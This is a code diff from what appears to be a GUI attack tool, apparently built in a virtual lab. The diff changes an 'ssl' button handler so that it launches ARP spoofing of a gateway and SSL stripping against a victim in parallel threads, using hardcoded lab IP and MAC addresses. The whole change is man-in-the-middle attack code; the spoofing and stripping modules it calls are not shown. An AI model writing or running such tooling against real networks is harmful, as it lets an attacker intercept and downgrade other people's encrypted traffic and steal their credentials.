@@ -270,7 +270,17 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)
 
     def ssl():
-        ssl_strip.start("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT)
+        print("MITM Activated")
+        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
+        print("SSL Stripping")
+        sslthread = threading.Thread(target=ssl_strip.start)
+        
+        gatewayspoof.start()
+        sslthread.start()
+        gatewayspoof.join()
+        sslthread.join()
+
+
 
     def exit():
         win.destroy()
